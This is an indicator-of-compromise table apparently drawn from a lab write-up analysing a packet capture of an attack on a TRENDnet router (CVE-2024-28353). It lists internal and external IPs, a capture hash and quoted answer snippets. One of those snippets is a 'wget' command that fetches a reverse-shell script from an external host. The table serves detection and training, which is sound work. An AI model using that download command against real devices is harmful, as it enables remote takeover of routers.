# IOCs - Trent

| Type | Value | Context |
| --- | --- | --- |
| IPv4 | 192.168.10.0 | ts" view, when sorted by the "Packets" column, identifies two IP addresses in the private 192.168.10.0 network, and one in 192.168.110.0: The rest are likely websites being viewed, |
| IPv4 | 192.168.110.0 | kets" column, identifies two IP addresses in the private 192.168.10.0 network, and one in 192.168.110.0: The rest are likely websites being viewed, or software being updated. We ca |
| IPv4 | 192.168.10.2 | coming from inside or outside of the network. Identify Attack The first TCP stream (0) is 192.168.10.2 loading login_pic.asp from 192.168.10.1, which claims to be a TEW-827DRU: A q |
| IPv4 | 192.168.10.1 | work. Identify Attack The first TCP stream (0) is 192.168.10.2 loading login_pic.asp from 192.168.10.1, which claims to be a TEW-827DRU: A quick search shows this is a TRENDnet AC2 |
| IPv4 | 35.159.25.253 | o log in again, and then try the same initial download command again. Answer: wget http://35.159.25.253:8000/a1l4m.sh 11. Multiple attempts to download the reverse shell from an ex |
| Hash | 0d33e5c7959f9bc089b35666714cad1a | ure. Artifacts Provided The download contains a single network capture file: trent.pcap - 0d33e5c7959f9bc089b35666714cad1a Skills Learnt Packet capture (PCAP) analysis Initial Anal |
| URL | http://35.159.25.253:8000/a1l4m.sh | have to log in again, and then try the same initial download command again. Answer: wget http://35.159.25.253:8000/a1l4m.sh 11. Multiple attempts to download the reverse shell from |
| CVE | CVE-2024-28353 | ? Searching for the parameter plus the model number and version returns the NVD entry for CVE-2024-28353: Without the firmware version number, we'll find a lot of posts about simil |
